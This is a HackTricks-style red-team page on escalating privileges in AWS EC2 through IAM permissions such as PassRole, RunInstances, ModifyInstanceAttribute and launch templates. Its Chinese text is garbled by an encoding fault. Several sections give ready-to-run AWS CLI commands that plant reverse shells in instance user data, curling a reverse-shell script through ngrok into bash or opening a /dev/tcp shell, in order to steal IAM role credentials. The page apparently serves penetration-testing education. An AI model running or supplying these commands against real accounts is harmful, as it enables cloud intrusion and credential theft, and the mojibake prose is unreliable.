# AWS - EC2 æƒé™æå‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## EC2

è·å–æ›´å¤š **å…³äº EC2 çš„ä¿¡æ¯** è¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

æ‹¥æœ‰ `iam:PassRole` å’Œ `ec2:RunInstances` æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ–°çš„ EC2 å®ä¾‹**ï¼Œä»–ä»¬å°†æ‹¥æœ‰æ“ä½œç³»ç»Ÿè®¿é—®æƒé™ï¼Œå¹¶ä¸”**å°†ç°æœ‰çš„ EC2 å®ä¾‹é…ç½®æ–‡ä»¶ä¼ é€’ç»™å®ƒ**ã€‚ç„¶åï¼Œä»–ä»¬å¯ä»¥ç™»å½•åˆ°å®ä¾‹å¹¶**ä» EC2 å®ä¾‹å…ƒæ•°æ®è¯·æ±‚å…³è”çš„ AWS å¯†é’¥**ï¼Œè¿™ä½¿ä»–ä»¬èƒ½å¤Ÿè®¿é—®å…³è”çš„å®ä¾‹é…ç½®æ–‡ä»¶/æœåŠ¡è§’è‰²æ‰€æ‹¥æœ‰çš„æ‰€æœ‰æƒé™ã€‚

* **é€šè¿‡ SSH è®¿é—®**

æ‚¨å¯ä»¥ä½¿ç”¨**åˆ›å»ºçš„** **ssh å¯†é’¥**ï¼ˆ`--key-name`ï¼‰è¿è¡Œä¸€ä¸ªæ–°å®ä¾‹ï¼Œç„¶å ssh è¿›å…¥å®ƒï¼ˆå¦‚æœæ‚¨æƒ³åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼Œæ‚¨å¯èƒ½éœ€è¦æ‹¥æœ‰æƒé™ `ec2:CreateKeyPair`ï¼‰ã€‚
```bash
aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
--iam-instance-profile Name=iam-full-access-ip --key-name my_ssh_key \
--security-group-ids sg-123456
```
* **é€šè¿‡ç”¨æˆ·æ•°æ®ä¸­çš„åå‘ shell è®¿é—®**

æ‚¨å¯ä»¥ä½¿ç”¨ **ç”¨æˆ·æ•°æ®** (`--user-data`) è¿è¡Œä¸€ä¸ªæ–°å®ä¾‹ï¼Œè¯¥æ•°æ®å°†å‘é€ç»™æ‚¨ä¸€ä¸ª **åå‘ shell**ã€‚è¿™æ ·åšæ— éœ€æŒ‡å®šå®‰å…¨ç»„ã€‚
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id ami-0c1bc246476a5572b --instance-type t2.micro \
--iam-instance-profile Name=EC2-CloudWatch-Agent-Role \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
å…³äºè¿™ç§æ”»å‡»ï¼Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå½“**EC2å®ä¾‹é…ç½®æ–‡ä»¶å‡­è¯åœ¨ç‰¹å®šå®ä¾‹ä¹‹å¤–ä½¿ç”¨æ—¶**ï¼Œè¿™æ˜¯ä¸€ä¸ª**æ˜æ˜¾çš„å…¥ä¾µè¿¹è±¡**ã€‚å³ä½¿AWS GuardDutyä¹Ÿä¼šè§¦å‘è¿™ä¸€ç‚¹ï¼ˆhttps://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types.html#unauthorized11ï¼‰ï¼Œå› æ­¤å°†è¿™äº›å‡­è¯æ³„éœ²å‡ºå»å¹¶åœ¨æœ¬åœ°è¿è¡Œå¹¶ä¸æ˜æ™ºï¼Œè€Œåº”è¯¥**åœ¨è¯¥EC2å®ä¾‹å†…éƒ¨è®¿é—®AWS API**ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä»»ä½•é™„åŠ åˆ°ç°æœ‰å®ä¾‹é…ç½®æ–‡ä»¶çš„EC2è§’è‰²ã€‚

#### æå‡æƒé™åˆ°ECS

æ‹¥æœ‰è¿™ç»„æƒé™ï¼Œä½ è¿˜å¯ä»¥**åˆ›å»ºä¸€ä¸ªEC2å®ä¾‹å¹¶å°†å…¶æ³¨å†Œåˆ°ECSé›†ç¾¤ä¸­**ã€‚è¿™æ ·ï¼ŒECS **æœåŠ¡**å°†åœ¨ä½ æœ‰è®¿é—®æƒé™çš„**EC2å®ä¾‹**å†…éƒ¨**è¿è¡Œ**ï¼Œç„¶åä½ å¯ä»¥æ¸—é€è¿™äº›æœåŠ¡ï¼ˆdockerå®¹å™¨ï¼‰å¹¶**çªƒå–å®ƒä»¬é™„åŠ çš„ECSè§’è‰²**ã€‚

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

è¦äº†è§£å¦‚ä½•**å¼ºåˆ¶ ECS æœåŠ¡åœ¨è¿™ä¸ªæ–°çš„ EC2 å®ä¾‹ä¸­è¿è¡Œ**ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

å¦‚æœæ‚¨**æ— æ³•åˆ›å»ºæ–°å®ä¾‹**ï¼Œä½†æ‹¥æœ‰æƒé™ `ecs:RegisterContainerInstance`ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿåœ¨é›†ç¾¤å†…æ³¨å†Œå®ä¾‹å¹¶æ‰§è¡Œä¸Šè¿°æ”»å‡»ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°é™„åŠ åˆ°ä»»åŠ¡çš„ ECS è§’è‰²ã€‚

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

ä¸å‰ä¸€ä¸ªåœºæ™¯ç±»ä¼¼ï¼Œæ‹¥æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥**æ›´æ”¹å—æŸå®ä¾‹çš„ IAM è§’è‰²**ï¼Œä»¥ä¾¿çªƒå–æ–°çš„å‡­è¯ã€‚\
ç”±äºå®ä¾‹é…ç½®æ–‡ä»¶åªèƒ½æœ‰ä¸€ä¸ªè§’è‰²ï¼Œå¦‚æœå®ä¾‹é…ç½®æ–‡ä»¶**å·²ç»æœ‰è§’è‰²**ï¼ˆå¸¸è§æƒ…å†µï¼‰ï¼Œæ‚¨è¿˜å°†éœ€è¦ **`iam:RemoveRoleFromInstanceProfile`**ã€‚

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

å¦‚æœ**å®ä¾‹é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªè§’è‰²**ï¼Œè€Œæ”»å‡»è€…**æ— æ³•ç§»é™¤å®ƒ**ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªè§£å†³æ–¹æ³•ã€‚ä»–å¯ä»¥**æ‰¾åˆ°**ä¸€ä¸ª**æ²¡æœ‰è§’è‰²çš„å®ä¾‹é…ç½®æ–‡ä»¶**æˆ–**åˆ›å»ºä¸€ä¸ªæ–°çš„**ï¼ˆ`iam:CreateInstanceProfile`ï¼‰ï¼Œ**æ·»åŠ **è§’è‰²åˆ°é‚£ä¸ª**å®ä¾‹é…ç½®æ–‡ä»¶**ï¼ˆå¦‚å‰æ‰€è¿°ï¼‰ï¼Œå¹¶**å°†å®ä¾‹é…ç½®æ–‡ä»¶å…³è”**åˆ°è¢«æ”»é™·çš„**å®ä¾‹**ï¼š

* å¦‚æœå®ä¾‹**æ²¡æœ‰ä»»ä½•å®ä¾‹é…ç½®æ–‡ä»¶**ï¼ˆ`ec2:AssociateIamInstanceProfile`ï¼‰\*

{% code overflow="wrap" %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä¸åŒçš„EC2è§’è‰²ï¼ˆä½ éœ€è¦å·²ç»ä¾µå…¥ä¸€ä¸ªAWS EC2å®ä¾‹å¹¶ä¸”æ‹¥æœ‰ä¸€äº›é¢å¤–çš„æƒé™æˆ–ç‰¹å®šçš„å®ä¾‹é…ç½®æ–‡ä»¶çŠ¶æ€ï¼‰ã€‚

### **`iam:PassRole`**ï¼ˆ`ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`ï¼‰|| `ec2:ReplaceIamInstanceProfileAssociation`

æ‹¥æœ‰è¿™äº›æƒé™å¯ä»¥æ›´æ”¹ä¸å®ä¾‹å…³è”çš„å®ä¾‹é…ç½®æ–‡ä»¶ï¼Œå› æ­¤å¦‚æœæ”»å‡»è€…å·²ç»è®¿é—®äº†ä¸€ä¸ªå®ä¾‹ï¼Œä»–å°†èƒ½å¤Ÿé€šè¿‡æ›´æ”¹ä¸ä¹‹å…³è”çš„å®ä¾‹é…ç½®æ–‡ä»¶æ¥çªƒå–æ›´å¤šå®ä¾‹é…ç½®æ–‡ä»¶è§’è‰²çš„å‡­è¯ã€‚

* å¦‚æœå®ƒ**æœ‰ä¸€ä¸ªå®ä¾‹é…ç½®æ–‡ä»¶**ï¼Œä½ å¯ä»¥**ç§»é™¤**å®ä¾‹é…ç½®æ–‡ä»¶ï¼ˆ`ec2:DisassociateIamInstanceProfile`ï¼‰å¹¶ä¸”**å…³è”**å®ƒ \*

{% code overflow="wrap" %}
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* æˆ–è€…**æ›¿æ¢**è¢«æ”»ç ´å®ä¾‹çš„**å®ä¾‹é…ç½®æ–‡ä»¶**ï¼ˆ`ec2:ReplaceIamInstanceProfileAssociation`ï¼‰ã€‚*

{% code overflow="wrap" %}
````
```bash
```plaintext
aws ec2 replace-iam-instance-profile-association --iam-instance-profile <value> --association-id <value>
```
```
````
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä¸åŒçš„EC2è§’è‰²ï¼ˆä½ éœ€è¦å·²ç»ä¾µå…¥ä¸€ä¸ªAWS EC2å®ä¾‹å¹¶ä¸”æ‹¥æœ‰ä¸€äº›é¢å¤–æƒé™æˆ–ç‰¹å®šçš„å®ä¾‹é…ç½®çŠ¶æ€ï¼‰ã€‚

### `ec2:RequestSpotInstances`,`iam:PassRole`

æ‹¥æœ‰æƒé™ **`ec2:RequestSpotInstances`å’Œ`iam:PassRole`** çš„æ”»å‡»è€…å¯ä»¥**è¯·æ±‚**ä¸€ä¸ªé™„åŠ äº†**EC2è§’è‰²**çš„**Spotå®ä¾‹**ï¼Œå¹¶åœ¨**ç”¨æˆ·æ•°æ®**ä¸­æ”¾ç½®ä¸€ä¸ª**åå‘Shell**ã€‚\
ä¸€æ—¦å®ä¾‹è¿è¡Œï¼Œä»–å¯ä»¥**çªƒå–IAMè§’è‰²**ã€‚

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
### `ec2:ModifyInstanceAttribute`

æ‹¥æœ‰ **`ec2:ModifyInstanceAttribute`** æƒé™çš„æ”»å‡»è€…å¯ä»¥ä¿®æ”¹å®ä¾‹å±æ€§ã€‚å…¶ä¸­ï¼Œä»–å¯ä»¥**æ›´æ”¹ç”¨æˆ·æ•°æ®**ï¼Œè¿™æ„å‘³ç€ä»–å¯ä»¥è®©å®ä¾‹**è¿è¡Œä»»æ„æ•°æ®**ã€‚è¿™å¯ä»¥ç”¨æ¥è·å–**EC2å®ä¾‹çš„åå‘shell**ã€‚

è¯·æ³¨æ„ï¼Œå±æ€§åªèƒ½åœ¨å®ä¾‹**åœæ­¢æ—¶è¢«ä¿®æ”¹**ï¼Œå› æ­¤è¿˜éœ€è¦**`ec2:StopInstances`** å’Œ **`ec2:StartInstances`** æƒé™ã€‚
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä»»ä½•é™„åŠ åˆ°åˆ›å»ºå®ä¾‹çš„ EC2 IAM è§’è‰²çš„æƒé™ã€‚

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

æ‹¥æœ‰ **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate` å’Œ `ec2:ModifyLaunchTemplate`** æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰ **åå‘ shell** çš„ **æ–°å¯åŠ¨æ¨¡æ¿ç‰ˆæœ¬**ï¼Œå¹¶åœ¨å…¶ä¸­åŒ…å« **ä»»ä½• EC2 IAM è§’è‰²**ï¼Œæ›´æ”¹é»˜è®¤ç‰ˆæœ¬ï¼Œä»¥åŠ **ä»»ä½•ä½¿ç”¨è¯¥å¯åŠ¨æ¨¡æ¿** çš„ **è‡ªåŠ¨ä¼¸ç¼©ç»„** å¦‚æœè¢« **é…ç½®** ä¸ºä½¿ç”¨ **æœ€æ–°** æˆ– **é»˜è®¤ç‰ˆæœ¬**ï¼Œå°†ä¼š **é‡æ–°è¿è¡Œå®ä¾‹** ä½¿ç”¨è¯¥æ¨¡æ¿å¹¶å°†æ‰§è¡Œåå‘ shellã€‚

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³ä¸åŒçš„EC2è§’è‰²ã€‚

### `autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`

æ‹¥æœ‰ **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªå¸¦æœ‰IAMè§’è‰²**å’Œ**ç”¨æˆ·æ•°æ®ä¸­çš„åå‘ shell** çš„**å¯åŠ¨é…ç½®**ï¼Œç„¶å**åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨ä¼¸ç¼©ç»„**ä½¿ç”¨è¯¥é…ç½®ï¼Œå¹¶ç­‰å¾…åå‘ shell æ¥**çªƒå–IAMè§’è‰²**ã€‚
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä¸åŒEC2è§’è‰²çš„æƒé™ã€‚

### `!autoscaling`

æƒé™é›† **`ec2:CreateLaunchTemplate`** å’Œ **`autoscaling:CreateAutoScalingGroup`** **ä¸è¶³ä»¥æå‡** æƒé™è‡³IAMè§’è‰²ï¼Œå› ä¸ºè¦é™„åŠ åœ¨å¯åŠ¨é…ç½®æˆ–å¯åŠ¨æ¨¡æ¿ä¸­æŒ‡å®šçš„è§’è‰²ï¼Œ**ä½ éœ€è¦æƒé™ `iam:PassRole` å’Œ `ec2:RunInstances`**ï¼ˆè¿™æ˜¯ä¸€ä¸ªå·²çŸ¥çš„æƒé™æå‡ï¼‰ã€‚

### `ec2-instance-connect:SendSSHPublicKey`

æ‹¥æœ‰æƒé™ **`ec2-instance-connect:SendSSHPublicKey`** çš„æ”»å‡»è€…å¯ä»¥æ·»åŠ sshå¯†é’¥ç»™ç”¨æˆ·ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥è®¿é—®ï¼ˆå¦‚æœä»–æœ‰å®ä¾‹çš„sshè®¿é—®æƒé™ï¼‰æˆ–ç”¨æ¥æå‡æƒé™ã€‚
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä¸è¿è¡Œå®ä¾‹å…³è”çš„EC2 IAMè§’è‰²çš„æƒé™ã€‚

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

æ‹¥æœ‰æƒé™ **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** çš„æ”»å‡»è€…å¯ä»¥**å‘ä¸²è¡Œè¿æ¥æ·»åŠ sshå¯†é’¥**ã€‚å¦‚æœä¸²è¡Œæœªå¯ç”¨ï¼Œæ”»å‡»è€…éœ€è¦æƒé™ **`ec2:EnableSerialConsoleAccess` æ¥å¯ç”¨å®ƒ**ã€‚

ä¸ºäº†è¿æ¥åˆ°ä¸²è¡Œç«¯å£ï¼Œæ‚¨è¿˜**éœ€è¦çŸ¥é“æœºå™¨å†…éƒ¨ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç **ã€‚

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
```markdown
{% endcode %}

è¿™ç§æ–¹å¼å¯¹äºææƒå¹¶ä¸æ˜¯å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºä½ éœ€è¦çŸ¥é“ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç æ‰èƒ½åˆ©ç”¨å®ƒã€‚

**æ½œåœ¨å½±å“ï¼š**ï¼ˆé«˜åº¦ä¸å¯èƒ½ï¼‰ç›´æ¥ææƒåˆ°è¿è¡Œå®ä¾‹æ‰€é™„åŠ çš„EC2 IAMè§’è‰²ã€‚

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) çš„githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
```
